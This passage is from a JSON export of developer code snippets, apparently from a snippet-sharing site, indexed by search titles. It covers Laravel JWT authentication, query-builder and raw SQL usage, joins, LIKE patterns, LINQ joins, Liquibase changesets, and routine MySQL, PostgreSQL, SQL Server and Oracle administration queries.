    "description": "composer require tymon/jwt-auth \nphp artisan jwt:secret\n    $ composer require tymon/jwt-auth:dev-develop --prefer-source \nphp artisan vendor:publish --provider=\"Tymon\\JWTAuth\\Providers\\LaravelServiceProvider\" \n'providers' => [      ...      Tymon\\JWTAuth\\Providers\\LaravelServiceProvider::class, ] \ncomposer create-project laravel/laravel laravel-jwt-auth --prefer-dist\n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1732,
    "keyword": null,
    "link": null,
    "title": " laravel jwt generate token",
    "description": "<?php  namespace App\\Http\\Controllers;  use Illuminate\\Support\\Facades\\Auth; use Illuminate\\Http\\Request; use Validator; use App\\User;   class AuthController extends Controller {      /**      * Create a new AuthController instance.      *      * @return void      */     public function __construct() {         $this->middleware('auth:api', ['except' => ['login', 'register']]);     }      /**      * Get a JWT via given credentials.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function login(Request $request){     \t$validator = Validator::make($request->all(), [             'email' => 'required|email',             'password' => 'required|string|min:6',         ]);          if ($validator->fails()) {             return response()->json($validator->errors(), 422);         }          if (! $token = auth()->attempt($validator->validated())) {             return response()->json(['error' => 'Unauthorized'], 401);         }          return $this->createNewToken($token);     }      /**      * Register a User.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function register(Request $request) {         $validator = Validator::make($request->all(), [             'name' => 'required|string|between:2,100',             'email' => 'required|string|email|max:100|unique:users',             'password' => 'required|string|confirmed|min:6',         ]);          if($validator->fails()){             return response()->json($validator->errors()->toJson(), 400);         }          $user = User::create(array_merge(                     $validator->validated(),                     ['password' => bcrypt($request->password)]                 ));          return response()->json([             'message' => 'User successfully registered',             'user' => $user         ], 201);     }       /**      * Log the user out (Invalidate the token).      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function logout() {         auth()->logout();          return response()->json(['message' => 'User successfully signed out']);     }      /**      * Refresh a token.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function refresh() {         return $this->createNewToken(auth()->refresh());     }      /**      * Get the authenticated User.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function userProfile() {         return response()->json(auth()->user());     }      /**      * Get the token array structure.      *      * @param  string $token      *      * @return \\Illuminate\\Http\\JsonResponse      */     protected function createNewToken($token){         return response()->json([             'access_token' => $token,             'token_type' => 'bearer',             'expires_in' => auth()->factory()->getTTL() * 60,             'user' => auth()->user()         ]);     }  }\nphp artisan jwt:secret\n    $ composer require tymon/jwt-auth:dev-develop --prefer-source \n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1733,
    "keyword": null,
    "link": null,
    "title": " laravel migration sql dump",
    "description": "# Squashing Migrations php artisan schema:dump  # Dump the current database schema and prune all existing migrations... php artisan schema:dump --prune\n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1734,
    "keyword": null,
    "link": null,
    "title": " laravel paginate raw sql",
    "description": "$items = DB::table('team')        ->selectRaw('SELECT *,earth_distance(ll_to_earth(team.lat, team.lng), ll_to_earth(23.1215939329,113.3096030895)) AS distance')     ->whereRaw('earth_box(ll_to_earth(23.1215939329,113.3096030895),1000) @> ll_to_earth(team.lat, team.lng)')     ->paginate(10);  foreach($items as $item) {     echo $item->distance; }\n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1735,
    "keyword": null,
    "link": null,
    "title": " laravel sql String",
    "description": "DB::table('users')->toSql()\n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1736,
    "keyword": null,
    "link": null,
    "title": " laravel sql query",
    "description": "DB::table('users')->toSql()\n$users = DB::table('users')             ->where('votes', '>', 100)             ->orWhere(function($query) {                 $query->where('name', 'Abigail')                       ->where('votes', '>', 50);             })             ->get();\nDB::statement('DROP TABLE users'); DB::statement('ALTER TABLE projects AUTO_INCREMENT=123');\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\nuse Illuminate\\Support\\Facades\\DB;  $users = DB::select('select * from users');  foreach ($users as $user) {     echo $user->name; }\nDB::connection()->getDatabaseName() //laravel\n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1737,
    "keyword": null,
    "link": null,
    "title": " laravel to sql",
    "description": "DB::enableQueryLog(); // Enable query log  // Your Eloquent query executed by using get()  dd(DB::getQueryLog()); // Show results of log\nDB::table('users')->toSql()\nuse Illuminate\\Support\\Facades\\DB;  $users = DB::select('select * from users');  foreach ($users as $user) {     echo $user->name; }\n/**  * Combines SQL and its bindings  *  * @param \\Eloquent $query  * @return string  */ public static function getEloquentSqlWithBindings($query) {     return vsprintf(str_replace('?', '%s', $query->toSql()), collect($query->getBindings())->map(function ($binding) {         $binding = addslashes($binding);         return is_numeric($binding) ? $binding : \"'{$binding}'\";     })->toArray()); }\n<!DOCTYPE html>  <html> <head> </head>  <body> This should  </body> <br><br><br><br> <form method=\"post\"> <button type=\"button\"> submit </button> </form> </html> \n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1738,
    "keyword": null,
    "link": null,
    "title": " laravel tosql with bindings",
    "description": "$query = DB::table('table')->whereIn('some_field', [1,2,30]);  $sql = $query->toSql();  $bindings = $query->getBindings();\n User::where('id' , \">\" , 10)->toSql(); \n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1739,
    "keyword": null,
    "link": null,
    "title": " last 6 months postgresql",
    "description": "CURRENT_DATE - INTERVAL '6 months'\n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1740,
    "keyword": null,
    "link": null,
    "title": " last  24 HOUR data in mysql",
    "description": "SELECT * FROM news WHERE date >= now() - INTERVAL 1 DAY; \n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1741,
    "keyword": null,
    "link": null,
    "title": " launch sql script from docker in mysql",
    "description": "docker exec <container_id> /bin/sh -c 'mysql -u root -ppassword </dummy.sql' \n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1742,
    "keyword": null,
    "link": null,
    "title": " left() in sql",
    "description": "#LEFT(string, number_of_chars)  #Extract 3 characters from a string (starting from left): SELECT LEFT('SQL Tutorial', 3) AS ExtractString; #Result -> SQL\n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1743,
    "keyword": null,
    "link": null,
    "title": " left join in codeigniter query builder",
    "description": "$this->db->select('p.id, p.photo, p.desc, info.desc'); $this->db->from('products as p'); $this->db->join('lang_info as info', 'info.id=p.id and info.lang='.$this->lang, 'left'); $this->db->where('p.id', $this->product_id); $this->db->where_in('info.name', ['good', 'bad']);\n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1744,
    "keyword": null,
    "link": null,
    "title": " left join in sql with 3 tables",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1745,
    "keyword": null,
    "link": null,
    "title": " left join multiple tables postgresql",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1746,
    "keyword": null,
    "link": null,
    "title": " left join mysql with where clause",
    "description": "/*Two tables: CUSTOMERS table and ORDERS table. ORDERS table contains STATUS attribute.*/ SELECT      customers.customerNumber,      customerName,      orderNumber,      status FROM     customers LEFT JOIN orders ON      orders.customerNumber = customers.customerNumber;\n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:56:32.000Z"
  },
  {
    "id": 1747,
    "keyword": null,
    "link": null,
    "title": " left join sql",
    "description": "/*Two tables: CUSTOMERS table and ORDERS table. ORDERS table contains STATUS attribute.*/ SELECT      customers.customerNumber,      customerName,      orderNumber,      status FROM     customers LEFT JOIN orders ON      orders.customerNumber = customers.customerNumber;\nSELECT table1.column1, table2.column2... FROM table1 LEFT JOIN table2 ON table1.common_field = table2.common_field; \nSELECT * FROM table_1 RIGHT JOIN table_2 ON table_1.common_field = table_2.common_field;\n#The RIGHT JOIN keyword Return all rows from the right table (table_name2), even if there are no #matches in the left table (table_name1).  syntax->SELECT column_name(s) FROM table_name1 RIGHT JOIN table_name2 ON table_name1.column_name=table_name2.column_name  ////example//// SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons RIGHT JOIN Orders ON Persons.P_Id=Orders.P_Id ORDER BY Persons.LastName  \n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n#LEFT JOIN: Return all rows from the left table, even if there are no matches in the right #table  syntax->SELECT column_name(s) FROM table_name1 LEFT JOIN table_name2 ON table_name1.column_name=table_name2.column_name  ////example///// SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons LEFT JOIN Orders ON Persons.P_Id=Orders.P_Id ORDER BY Persons.LastName  \n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1748,
    "keyword": null,
    "link": null,
    "title": " left join vs left outer join mysql",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1749,
    "keyword": null,
    "link": null,
    "title": " like case insensitive",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1750,
    "keyword": null,
    "link": null,
    "title": " like in mysql",
    "description": "WHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"\nSELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\nSELECT name FROM products WHERE name LIKE '%Value1' OR name LIKE '%Value2';\t \nThe LIKE operator is a logical operator that tests whether a string contains a specified pattern or not. Here is the syntax of the LIKE operator:  expression LIKE pattern ESCAPE escape_character  This example uses the LIKE operator to find employees whose first names start with a:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     firstName LIKE 'a%';          This example uses the LIKE operator to find employees whose last names end with on e.g., Patterson, Thompson:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastName LIKE '%on';               For example, to find all employees whose last names contain on , you use the following query with the pattern %on%  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastname LIKE '%on%';\nSELECT * from fiberbox where field REGEXP '1740|1938|1940'; \n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1751,
    "keyword": null,
    "link": null,
    "title": " like query",
    "description": "WHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"\n#SELECT * FROM table_name WHERE columnName LIKE pattern; SELECT * FROM wilayah_2020 WHERE kode LIKE \"82%\"   kode\t\t\tnama \t --------------------------------- 82.72.08 \t\tTidore Timur 82.72.08.1001 \tMafututu 82.72.08.1002 \tTosa 82.72.08.1003 \tDowora 82.72.08.1004 \tKalaodi 82.72.08.1005 \tCobodoe 82.72.08.1006 \tDoyado 82.72.08.1007 \tJiko Cobo  # 'a%'\tFinds any values that start with \"a\" # '%a'\tFinds any values that end with \"a\" # '%or%'\tFinds any values that have \"or\" in any position # '_r%'\tFinds any values that have \"r\" in the second position # 'a_%'\tFinds any values that start with \"a\" and are at least 2 characters in length # 'a__%'\tFinds any values that start with \"a\" and are at least 3 characters in length # 'a%o'\tFinds any values that start with \"a\" and ends with \"o\"\nThe LIKE operator is a logical operator that tests whether a string contains a specified pattern or not. Here is the syntax of the LIKE operator:  expression LIKE pattern ESCAPE escape_character  This example uses the LIKE operator to find employees whose first names start with a:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     firstName LIKE 'a%';          This example uses the LIKE operator to find employees whose last names end with on e.g., Patterson, Thompson:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastName LIKE '%on';               For example, to find all employees whose last names contain on , you use the following query with the pattern %on%  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastname LIKE '%on%';\n-- example SELECT Id, ProductName, UnitPrice, Package   FROM Product  WHERE ProductName LIKE 'Cha_' OR ProductName LIKE 'Chan_'\neturns true if the operand value matches a pattern. Example: Returns true if the user&rsquo;s first_name ends with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name LIKE '%son'; \nWHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"  (Like) Operator for partial searches using wildcard '%' and '_' For Example: Select * From Employees Where last_name LIKE '_a%';\n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1752,
    "keyword": null,
    "link": null,
    "title": " like sql",
    "description": "WHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"\n#SELECT * FROM table_name WHERE columnName LIKE pattern; SELECT * FROM wilayah_2020 WHERE kode LIKE \"82%\"   kode\t\t\tnama \t --------------------------------- 82.72.08 \t\tTidore Timur 82.72.08.1001 \tMafututu 82.72.08.1002 \tTosa 82.72.08.1003 \tDowora 82.72.08.1004 \tKalaodi 82.72.08.1005 \tCobodoe 82.72.08.1006 \tDoyado 82.72.08.1007 \tJiko Cobo  # 'a%'\tFinds any values that start with \"a\" # '%a'\tFinds any values that end with \"a\" # '%or%'\tFinds any values that have \"or\" in any position # '_r%'\tFinds any values that have \"r\" in the second position # 'a_%'\tFinds any values that start with \"a\" and are at least 2 characters in length # 'a__%'\tFinds any values that start with \"a\" and are at least 3 characters in length # 'a%o'\tFinds any values that start with \"a\" and ends with \"o\"\nSELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n-- example SELECT Id, ProductName, UnitPrice, Package   FROM Product  WHERE ProductName LIKE 'Cha_' OR ProductName LIKE 'Chan_'\neturns true if the operand value matches a pattern. Example: Returns true if the user&rsquo;s first_name ends with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name LIKE '%son'; \nsyntax => SELECT column_name(s) FROM table_name WHERE column_name LIKE pattern  ////example///// ///The \"%\" sign can be used to define wildcards (missing letters in the pattern) both before and after the pattern. SELECT * FROM Persons WHERE City LIKE 's%' \n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1753,
    "keyword": null,
    "link": null,
    "title": " limit offset order by mysql",
    "description": "                                     SELECT      column_list FROM     table1 ORDER BY column_list LIMIT row_count OFFSET offset;\n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1754,
    "keyword": null,
    "link": null,
    "title": " link django to mysql",
    "description": "$ brew reinstall openssl \t#run two commands under \"For compilers to find openssl@1.1 you may need to set:\" $ pip install mysqlclient\n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1755,
    "keyword": null,
    "link": null,
    "title": " linq join",
    "description": "var id = 1; var query =    from post in database.Posts    join meta in database.Post_Metas on post.ID equals meta.Post_ID    where post.ID == id    select new { Post = post, Meta = meta };\n var locationInfo = entities.TagTemperatures    // your starting point - table in the \"from\" statement             .Join(entities.ReverseGeoFenceAddresses, // the source table of the inner join                tt => tt.TagTemperatureId,        // Select the primary key (the first part of the \"on\" clause in an sql \"join\" statement)                rg => rg.TagTemperatureId,   // Select the foreign key (the second part of the \"on\" clause)                (tt, rg) => new { TT = tt, RG = rg }) // selection             .Where(TTandRG => TTandRG.TT.TagId == tag.TagId && TTandRG.TT.SampleTime > StartDate && TTandRG.TT.SampleTime < EndDate)             .Select(X => new { X.TT.Latitude, X.TT.Longitude, X.TT.SampleTime, X.TT.TemperatureCelsius, X.TT.isAlert, X.TT.isYAlert, X.RG.FullAddress }).ToList();    // where statement\nIList<Student> studentList = new List<Student>() {      new Student() { StudentID = 1, StudentName = \"John\", StandardID =1 },     new Student() { StudentID = 2, StudentName = \"Moin\", StandardID =1 },     new Student() { StudentID = 3, StudentName = \"Bill\", StandardID =2 },     new Student() { StudentID = 4, StudentName = \"Ram\" , StandardID =2 },     new Student() { StudentID = 5, StudentName = \"Ron\"  }  };  IList<Standard> standardList = new List<Standard>() {      new Standard(){ StandardID = 1, StandardName=\"Standard 1\"},     new Standard(){ StandardID = 2, StandardName=\"Standard 2\"},     new Standard(){ StandardID = 3, StandardName=\"Standard 3\"} };  var innerJoin = studentList.Join(// outer sequence                        standardList,  // inner sequence                        student => student.StandardID,    // outerKeySelector                       standard => standard.StandardID,  // innerKeySelector                       (student, standard) => new  // result selector                                     {                                         StudentName = student.StudentName,                                         StandardName = standard.StandardName                                     });\nIList<string> strList1 = new List<string>() {      \"One\",      \"Two\",      \"Three\",      \"Four\" };  IList<string> strList2 = new List<string>() {      \"One\",      \"Two\",      \"Five\",      \"Six\" };  var innerJoin = strList1.Join(strList2,                       str1 => str1,                        str2 => str2,                        (str1, str2) => str1);\nIList<Student> studentList = new List<Student>() {      new Student() { StudentID = 1, StudentName = \"John\", Age = 13, StandardID =1 },     new Student() { StudentID = 2, StudentName = \"Moin\",  Age = 21, StandardID =1 },     new Student() { StudentID = 3, StudentName = \"Bill\",  Age = 18, StandardID =2 },     new Student() { StudentID = 4, StudentName = \"Ram\" , Age = 20, StandardID =2 },     new Student() { StudentID = 5, StudentName = \"Ron\" , Age = 15 }  };  IList<Standard> standardList = new List<Standard>() {      new Standard(){ StandardID = 1, StandardName=\"Standard 1\"},     new Standard(){ StandardID = 2, StandardName=\"Standard 2\"},     new Standard(){ StandardID = 3, StandardName=\"Standard 3\"} };  var innerJoin = from s in studentList // outer sequence                       join st in standardList //inner sequence                        on s.StandardID equals st.StandardID // key selector                        select new { // result selector                                      StudentName = s.StudentName,                                      StandardName = st.StandardName                                  };\n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1756,
    "keyword": null,
    "link": null,
    "title": " linux command line import mysql database",
    "description": "# if your database is not locally hosted mysql -u username -p -h dbhost dbname < filename.sql\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1757,
    "keyword": null,
    "link": null,
    "title": " liquibase add column to existing primary key",
    "description": " <changeSet author=\"yours_truly\" id=\"EXAMPLE-02-01-dropPK\">     <dropPrimaryKey  tableName= \"our_awesome_table\" constraintName=\"CPK_OUR_AWESOME_TABLE\"/>  </changeSet>    <changeSet author=\"yours_truly\" id=\"EXAMPLE-02-01-addNNcol\">       <addColumn tableName=\"our_awesome_table\">          <column name=\"CREATED_AT\" type=\"datetime\" valueDate=\"current_datetime\" defaultValueDate=\"current_datetime\">             <constraints nullable=\"false\"/>        </column>     </addColumn> </changeSet>  <changeSet author=\"yours_truly\" id=\"EXAMPLE-02-02\">     <addPrimaryKey tableName=\"our_awesome_table\" columnNames=\"source,external_id,CREATED_AT\" constraintName=\"CPK_OUR_AWESOME_TABLE\"/> </changeSet> \n",
    "reg_date": "2021-10-12T09:56:33.000Z"
  },
  {
    "id": 1758,
    "keyword": null,
    "link": null,
    "title": " liquibase update row",
    "description": "<changeSet author=\"name\" id=\"123\">     <update tableName=\"SomeTable\">         <column name=\"PropertyToSet\" value=\"1\" />         <where>otherProperty = 'otherPropertyValue'</where>     </update> </changeSet> \n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1759,
    "keyword": null,
    "link": null,
    "title": " list all foreign keys for a table postgres",
    "description": "select kcu.table_schema || '.' ||kcu.table_name as foreign_table,        '>-' as rel,        rel_tco.table_schema || '.' || rel_tco.table_name as primary_table,        string_agg(kcu.column_name, ', ') as fk_columns,        kcu.constraint_name from information_schema.table_constraints tco join information_schema.key_column_usage kcu           on tco.constraint_schema = kcu.constraint_schema           and tco.constraint_name = kcu.constraint_name join information_schema.referential_constraints rco           on tco.constraint_schema = rco.constraint_schema           and tco.constraint_name = rco.constraint_name join information_schema.table_constraints rel_tco           on rco.unique_constraint_schema = rel_tco.constraint_schema           and rco.unique_constraint_name = rel_tco.constraint_name where tco.constraint_type = 'FOREIGN KEY' group by kcu.table_schema,          kcu.table_name,          rel_tco.table_name,          rel_tco.table_schema,          kcu.constraint_name order by kcu.table_schema,          kcu.table_name;\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1760,
    "keyword": null,
    "link": null,
    "title": " list all permissions on a table in postgres",
    "description": "SELECT grantee, privilege_type  FROM information_schema.role_table_grants  WHERE table_name='mytable'\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1761,
    "keyword": null,
    "link": null,
    "title": " list all the tables in sql",
    "description": "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nBY LOVE SINGH on May 19 2020  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nselect tablespace_name, table_name from all_tables; \n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1762,
    "keyword": null,
    "link": null,
    "title": " list all triggers on sql server database",
    "description": "SELECT       name,     is_instead_of_trigger FROM      sys.triggers   WHERE      type = 'TR';\nSELECT       sysobjects.name AS trigger_name      ,USER_NAME(sysobjects.uid) AS trigger_owner      ,s.name AS table_schema      ,OBJECT_NAME(parent_obj) AS table_name      ,OBJECTPROPERTY( id, 'ExecIsUpdateTrigger') AS isupdate      ,OBJECTPROPERTY( id, 'ExecIsDeleteTrigger') AS isdelete      ,OBJECTPROPERTY( id, 'ExecIsInsertTrigger') AS isinsert      ,OBJECTPROPERTY( id, 'ExecIsAfterTrigger') AS isafter      ,OBJECTPROPERTY( id, 'ExecIsInsteadOfTrigger') AS isinsteadof      ,OBJECTPROPERTY(id, 'ExecIsTriggerDisabled') AS [disabled]  FROM sysobjects   INNER JOIN sysusers      ON sysobjects.uid = sysusers.uid   INNER JOIN sys.tables t      ON sysobjects.parent_obj = t.object_id   INNER JOIN sys.schemas s      ON t.schema_id = s.schema_id   WHERE sysobjects.type = 'TR' \n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1763,
    "keyword": null,
    "link": null,
    "title": " list database in ubuntu",
    "description": "SHOW DATABASES;\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1764,
    "keyword": null,
    "link": null,
    "title": " list foreign key oracle",
    "description": "SELECT c.OWNER, a.TABLE_NAME, a.COLUMN_NAME, a.CONSTRAINT_NAME,         c.R_OWNER AS REF_OWNER, cpk.TABLE_NAME AS REF_TABLE,         cpk.CONSTRAINT_NAME AS REF_PK FROM ALL_CONS_COLUMNS a  JOIN ALL_CONSTRAINTS c ON a.OWNER = c.OWNER     AND a.CONSTRAINT_NAME = c.CONSTRAINT_NAME  JOIN ALL_CONSTRAINTS cpk ON c.R_OWNER = cpk.OWNER     AND c.R_CONSTRAINT_NAME = cpk.CONSTRAINT_NAME WHERE c.CONSTRAINT_TYPE = 'R' AND c.TABLE_NAME= 'table_name';\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1765,
    "keyword": null,
    "link": null,
    "title": " list in one column mysql",
    "description": "country table ------------- id name other_column   rule table ---------- id name other_column   countryrules table ------------------ country_id rule_id\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1766,
    "keyword": null,
    "link": null,
    "title": " list mysql tables and views",
    "description": "SHOW TABLES;  -- With type TABLE or VIEW SHOW FULL TABLES;\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1767,
    "keyword": null,
    "link": null,
    "title": " list mysql users",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\n//To show all data use following query select * from mysql.user; // To show user and host use following query select User,Host from mysql.user;\nSELECT User FROM mysql.user;\nmysql> select host, user, password from mysql.user; \n#display all user data select * from mysql.user; #display username and host select user, host from mysql.user;\nSELECT * FROM mysql.user;  SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user; SHOW GRANTS FOR 'my_user'@'localhost';\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1768,
    "keyword": null,
    "link": null,
    "title": " list tables sqlalchemy",
    "description": "engine.table_names()\n$ python >>> from myapp import db >>> db.engine.table_names()\n",
    "reg_date": "2021-10-12T09:56:34.000Z"
  },
  {
    "id": 1769,
    "keyword": null,
    "link": null,
    "title": " list tables sqlite",
    "description": ">sqlite3 c:\\db\\my_base\t\t\t\t\t\t-- opens database sqlite> .tables\t\t\t\t\t\t\t\t-- all tables sqlite> .table '%es'\t\t\t\t\t\t-- tables ending with 'es' -- Via SQL: SELECT name FROM  sqlite_master  WHERE type ='table' AND name NOT LIKE 'sqlite_%';\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1770,
    "keyword": null,
    "link": null,
    "title": " loading local data is disabled mysql",
    "description": "mysql> set global local_infile=true;\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1771,
    "keyword": null,
    "link": null,
    "title": " local sql server",
